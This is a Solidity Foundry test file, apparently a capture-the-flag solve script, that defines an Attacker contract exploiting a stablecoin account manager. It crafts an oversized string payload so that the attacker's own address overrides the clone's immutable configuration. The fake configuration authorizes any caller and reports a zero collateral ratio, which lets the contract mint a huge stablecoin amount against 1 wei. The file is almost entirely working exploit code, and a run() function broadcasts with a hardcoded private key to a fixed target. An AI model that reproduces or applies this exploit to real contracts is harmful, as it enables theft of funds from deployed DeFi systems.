// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Challenge.sol";
import "../src/AccountManager.sol";
import "../src/Account.sol";
import {Account as Acct} from "../src/Account.sol";

contract Attacker {
    constructor() payable {}

    function start(address addr) external {
        Challenge challenge = Challenge(addr);
        SystemConfiguration config = SystemConfiguration(
            challenge.SYSTEM_CONFIGURATION()
        );
        AccountManager manager = AccountManager(config.getAccountManager());
        address[] memory recovery = new address[](2046);
        {
            Acct account = manager.openAccount(address(this), recovery);
            account.deposit{value: 1}();
            bytes memory payload = new bytes(uint16(uint160(address(config)) >> 80));
            bytes memory x = abi.encodePacked(bytes20(address(this)), bytes20(address(this)));
            for(uint i = 0; i < x.length; i++) {
                payload[20+i] = x[i];
            }
            manager.mintStablecoins(account, 1_000_000_000_000 ether + 1, string(payload));
        }
    }

    function isAuthorized(address who) external view returns (bool) {
        return true;
    }

    function getEthUsdPriceFeed() external view returns (address) {
        return 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    }

    function getCollateralRatio() external view returns (uint256) {
        uint256 collateralRatio = 0;
        return collateralRatio;
    }

    receive() external payable {}
}

contract ContractTest is Test {
    function testExploit() public {
        Attacker attacker = new Attacker{value: 1}();
        attacker.start(0x0ed0C3EdA206bEA6869B02371Db62f5b1d24DFCB);
    }
    function run() public {
        vm.startBroadcast(0x3e31eb0e637ca03b73ebd287e038a45a493018e46c9d8b21ed4c6ddaf17da7aa);
        Attacker attacker = new Attacker{value: 999 ether}();
        attacker.start(0x0ed0C3EdA206bEA6869B02371Db62f5b1d24DFCB);
        vm.stopBroadcast();
    }
}
